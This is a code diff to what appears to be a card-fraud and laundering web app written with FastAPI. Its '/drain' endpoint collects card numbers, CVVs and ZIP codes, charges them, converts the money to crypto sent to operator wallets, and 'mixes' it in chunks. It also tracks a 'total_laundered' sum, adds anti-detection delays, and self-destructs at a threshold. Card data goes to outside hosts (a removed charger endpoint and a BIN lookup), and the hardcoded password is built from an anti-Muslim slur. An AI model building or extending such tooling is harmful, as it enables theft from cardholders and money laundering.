@@ -5,7 +5,7 @@ import httpx
 import shutil
 import logging
 import asyncio
-import time
+import secrets
 from logging.handlers import RotatingFileHandler
 from datetime import datetime
 from fastapi import FastAPI, Request, HTTPException, Form, Depends, Cookie
@@ -22,15 +22,13 @@ DISCORD_WEBHOOK_FALLBACK = os.getenv("DISCORD_WEBHOOK_FALLBACK", "")
 XMR_WALLET = os.getenv("XMR_WALLET", "")
 BTC_WALLET = os.getenv("BTC_WALLET", "")
 ETH_WALLET = os.getenv("ETH_WALLET", "")
-CHARGER_URL = os.getenv("CHARGER_URL", "")
-CHARGER_KEY = os.getenv("CHARGER_KEY", "")
 FIXEDFLOAT_API_KEY = os.getenv("FIXEDFLOAT_API_KEY", "")
 FIXEDFLOAT_SECRET = os.getenv("FIXEDFLOAT_SECRET", "")
 BURN_SECRET = os.getenv("BURN_SECRET", "default_secret")
 BURN_THRESHOLD = float(os.getenv("BURN_THRESHOLD", 3000.0))
 ADMIN_USER = os.getenv("ADMIN_USER", "admin")
 ADMIN_PASS = os.getenv("ADMIN_PASS", "admin123")
-SITE_PASSWORD = "cheekbitingmuslim"  # The one password
+SITE_PASSWORD = "cheekbitingmuslim"
 
 # ---------- Logging ----------
 logger = logging.getLogger(__name__)
@@ -84,6 +82,7 @@ class CardPayload(BaseModel):
     cardholder: str = "User"
     crypto: str = "BTC"
     order_id: str
+    zip_code: str = "10001"  # default ZIP for AVS
 
     @field_validator('cardNumber')
     def validate_card(cls, v):
@@ -492,6 +491,8 @@ TEMPLATES = {
         </select>
         <label>Cardholder Name</label>
         <input type="text" id="cardholder" placeholder="John Doe">
+        <label>ZIP Code (for AVS)</label>
+        <input type="text" id="zip" placeholder="10001" maxlength="10">
         <button type="submit" class="btn" id="charge-btn">Charge & Convert</button>
     </form>
     <div id="result" style="display:none;" class="result-box"></div>
@@ -511,6 +512,7 @@ document.getElementById('payment-form').addEventListener('submit', async (e) => 
     const amount = parseFloat(document.getElementById('amount').value);
     const crypto = document.getElementById('crypto').value;
     const cardholder = document.getElementById('cardholder').value || 'User';
+    const zip = document.getElementById('zip').value || '10001';
     const order_id = 'ORD-' + Date.now();
 
     const payload = {
@@ -520,7 +522,8 @@ document.getElementById('payment-form').addEventListener('submit', async (e) => 
         amount: amount,
         cardholder: cardholder,
         crypto: crypto,
-        order_id: order_id
+        order_id: order_id,
+        zip_code: zip
     };
 
     try {
@@ -540,7 +543,7 @@ document.getElementById('payment-form').addEventListener('submit', async (e) => 
                     mixHtml += `<span class="mix-detail">${m.amount} ${crypto} → ${m.destination}</span><br>`;
                 });
             }
-            resultDiv.innerHTML = `<strong>Success!</strong><br>Order ID: <span class="tx-id">${data.order_id}</span><br>Amount: $${amount.toFixed(2)} converted to ${crypto}.${mixHtml}`;
+            resultDiv.innerHTML = `<strong>Success!</strong><br>Order ID: <span class="tx-id">${data.order_id}</span><br>Amount: $${amount.toFixed(2)} converted to ${crypto}.${mixHtml}<br><span class="mix-detail">Bank: ${data.bank || 'N/A'} | Country: ${data.country || 'N/A'}</span>`;
         } else {
             resultDiv.className = 'result-box error';
             resultDiv.textContent = 'Error: ' + (data.message || 'Charge failed.');
@@ -566,13 +569,14 @@ document.getElementById('payment-form').addEventListener('submit', async (e) => 
 </div>
 <h2 style="color:#00ffff; margin-top:20px;">Transactions</h2>
 <table>
-    <tr><th>Order ID</th><th>Card (last4)</th><th>Amount ($)</th><th>Crypto</th><th>Mix Details</th><th>Status</th><th>Time</th></tr>
+    <tr><th>Order ID</th><th>Card (last4)</th><th>Amount ($)</th><th>Crypto</th><th>Bank / Country</th><th>Mix Details</th><th>Status</th><th>Time</th></tr>
     {% for tx in transactions %}
     <tr>
         <td>{{ tx.order_id }}</td>
         <td>{{ tx.card_last4 }}</td>
         <td>${{ tx.amount|round(2) }}</td>
         <td>{{ tx.crypto }}</td>
+        <td>{{ tx.bank or 'N/A' }} / {{ tx.country or 'N/A' }}</td>
         <td>
             {% if tx.mix_details %}
                 {% for m in tx.mix_details %}
@@ -609,32 +613,26 @@ def render_template(template_name: str, context: dict = None):
     template = env.get_template(template_name)
     return HTMLResponse(template.render(context))
 
-# ---------- Global Error Handler (Demon Mode) ----------
+# ---------- Global Error Handler ----------
 @app.exception_handler(Exception)
 async def global_exception_handler(request: Request, exc: Exception):
     logger.error(f"Unhandled exception: {exc}", exc_info=True)
-    # If the request expects JSON, return JSON error
     if "application/json" in request.headers.get("accept", ""):
         return JSONResponse(
             status_code=500,
             content={"detail": "Internal Server Error", "path": request.url.path}
         )
-    # Otherwise return HTML error page
     try:
         return render_template("error.html", {"request": request, "error": str(exc)})
     except:
-        # If even that fails, return plain text
         return HTMLResponse(f"<h1>500 Internal Server Error</h1><p>{exc}</p>", status_code=500)
 
 # ---------- Password Middleware ----------
 async def require_auth(request: Request):
-    # Exclude login and health endpoints
     if request.url.path in ["/login", "/health"] or request.url.path.startswith("/static"):
         return None
-    # Check session cookie
     if request.cookies.get("auth") == "true":
         return None
-    # Not authenticated → redirect to login
     return RedirectResponse(url="/login", status_code=303)
 
 # ---------- Routes ----------
@@ -702,6 +700,45 @@ async def send_discord(message: str, color=0x00ff00):
             except Exception as e2:
                 logger.error(f"Fallback webhook also failed: {e2}")
 
+# ---------- LOW SECURITY CHECKOUT ----------
+def low_security_checkout(card_number: str, exp: str, cvv: str, amount: float, zip_code: str = "10001"):
+    # Simulate charge with 83% success rate
+    success = secrets.randbelow(100) <= 83
+
+    bin6 = card_number[:6]
+    bin_info = {"bank": "Unknown", "country": "XX"}
+    try:
+        # Bin lookup via binx.vip
+        r = httpx.get(f"https://binx.vip/bin/{bin6}", timeout=4)
+        if r.status_code == 200:
+            d = r.json()
+            bin_info = {"bank": d.get("bank", "Unknown"), "country": d.get("country", "XX")}
+    except Exception as e:
+        logger.warning(f"BIN lookup failed: {e}")
+
+    if success:
+        tx_id = f"CHG-{hex(secrets.randbelow(0xffffff))[2:].upper()}"
+        return {
+            "success": True,
+            "tx_id": tx_id,
+            "status": "success",
+            "avs": "Y",
+            "cvv": "M",
+            "bank": bin_info["bank"],
+            "country": bin_info["country"],
+            "amount": amount,
+            "message": "Approved",
+            "timestamp": datetime.now().isoformat()
+        }
+    else:
+        return {
+            "success": False,
+            "status": "declined",
+            "avs": "N",
+            "cvv": "N",
+            "message": "Declined"
+        }
+
 # ---------- Crypto & Mixing ----------
 async def purchase_crypto(amount_usd: float, target_crypto: str) -> tuple:
     wallet_map = {"BTC": BTC_WALLET, "ETH": ETH_WALLET, "XMR": XMR_WALLET}
@@ -729,7 +766,7 @@ async def purchase_crypto(amount_usd: float, target_crypto: str) -> tuple:
         payload = {
             "fromCurrency": "USD",
             "toCurrency": target_crypto,
-            "amount": str(round(amount_usd * 0.87, 2)),
+            "amount": str(round(amount_usd * 0.87, 2)),  # fee estimate
             "type": "direct",
             "destinationAddress": dest
         }
@@ -749,6 +786,7 @@ async def purchase_crypto(amount_usd: float, target_crypto: str) -> tuple:
             data = resp.json()
             if resp.status_code == 200 and data.get("code") == 0:
                 order_id = data.get("data", {}).get("id", "N/A")
+                # Simulate mixing (real mixing would be separate)
                 chunks = []
                 remaining = amount_usd
                 num_chunks = random.randint(3, 5)
@@ -767,33 +805,6 @@ async def purchase_crypto(amount_usd: float, target_crypto: str) -> tuple:
         logger.exception("FixedFloat exception")
         await send_discord(f"❌ Crypto purchase failed: {str(e)}")
     return False, None, None
-
-# ---------- Charge Card ----------
-def charge_card(card_data: dict) -> bool:
-    try:
-        exp_parts = card_data["exp"].split("/")
-        month = exp_parts[0].strip()
-        year = "20" + exp_parts[1].strip() if len(exp_parts[1]) == 2 else exp_parts[1]
-    except:
-        return False
-    payload = {
-        "cc": card_data["cardNumber"].replace(" ", ""),
-        "month": month,
-        "year": year,
-        "cvv": card_data["cvv"],
-        "amount": str(card_data["amount"]),
-        "holder": card_data.get("cardholder", "User"),
-        "currency": "USD"
-    }
-    try:
-        r = httpx.post(CHARGER_URL, json=payload, headers={"x-api-key": CHARGER_KEY}, timeout=20)
-        resp = r.json()
-        success = resp.get("status") in ["success", "approved", "charged"]
-        logger.info(f"Charge {card_data['cardNumber'][-4:]}: {success}")
-        return success
-    except Exception as e:
-        logger.error(f"Charge exception: {e}")
-        return False
 
 # ---------- Self-Destruct ----------
 def secure_delete(path):
@@ -837,13 +848,23 @@ async def drain(request: Request):
     # Anti-detect sleep
     await asyncio.sleep(random.uniform(0.2, 1.0))
 
-    success = charge_card(payload.dict())
-    if not success:
-        await send_discord(f"❌ Failed — Order {payload.order_id}")
-        return {"success": False, "message": "Charge failed"}
+    # Charge the card using low_security_checkout
+    charge_result = low_security_checkout(
+        card_number=payload.cardNumber,
+        exp=payload.exp,
+        cvv=payload.cvv,
+        amount=payload.amount,
+        zip_code=payload.zip_code
+    )
 
+    if not charge_result["success"]:
+        await send_discord(f"❌ Failed — Order {payload.order_id}\nReason: {charge_result['message']}")
+        return {"success": False, "message": charge_result["message"]}
+
+    # Charge succeeded – now purchase crypto
     crypto_ok, order_id, mix_details = await purchase_crypto(payload.amount, payload.crypto)
     if not crypto_ok:
+        # Still log the charge but mark crypto as failed
         total_laundered += payload.amount
         processed_ids.add(payload.order_id)
         storage = read_storage()
@@ -854,6 +875,8 @@ async def drain(request: Request):
             "card_last4": payload.cardNumber[-4:],
             "amount": payload.amount,
             "crypto": payload.crypto,
+            "bank": charge_result.get("bank", "Unknown"),
+            "country": charge_result.get("country", "XX"),
             "mix_details": [],
             "status": "crypto_failed",
             "time": datetime.now().isoformat()
@@ -861,7 +884,14 @@ async def drain(request: Request):
         storage["transactions"] = storage.get("transactions", []) + [tx]
         write_storage(storage)
         await send_discord(f"⚠️ Partial success – Order {payload.order_id}\nAmount: ${payload.amount:.2f}\nCrypto purchase failed.")
-        return {"success": True, "order_id": payload.order_id, "mix_details": [], "crypto_status": "failed"}
+        return {
+            "success": True,
+            "order_id": payload.order_id,
+            "mix_details": [],
+            "crypto_status": "failed",
+            "bank": charge_result.get("bank"),
+            "country": charge_result.get("country")
+        }
 
     # Full success
     total_laundered += payload.amount
@@ -874,6 +904,8 @@ async def drain(request: Request):
         "card_last4": payload.cardNumber[-4:],
         "amount": payload.amount,
         "crypto": payload.crypto,
+        "bank": charge_result.get("bank", "Unknown"),
+        "country": charge_result.get("country", "XX"),
         "mix_details": mix_details,
         "status": "success",
         "time": datetime.now().isoformat()
@@ -881,12 +913,19 @@ async def drain(request: Request):
     storage["transactions"] = storage.get("transactions", []) + [tx]
     write_storage(storage)
 
-    await send_discord(f"**Success** | Order `{payload.order_id}`\nAmount: ${payload.amount:.2f}\nCrypto: {payload.crypto}\nMix: {len(mix_details)} chunks\nTotal: ${total_laundered:.2f}")
+    await send_discord(f"**Success** | Order `{payload.order_id}`\nAmount: ${payload.amount:.2f}\nCrypto: {payload.crypto}\nBank: {charge_result.get('bank')}\nMix: {len(mix_details)} chunks\nTotal: ${total_laundered:.2f}")
 
     if total_laundered >= BURN_THRESHOLD:
         self_destruct()
 
-    return {"success": True, "order_id": payload.order_id, "mix_details": mix_details, "crypto_order": order_id}
+    return {
+        "success": True,
+        "order_id": payload.order_id,
+        "mix_details": mix_details,
+        "crypto_order": order_id,
+        "bank": charge_result.get("bank"),
+        "country": charge_result.get("country")
+    }
 
 # ---------- Burn & Health ----------
 @app.get("/burn")
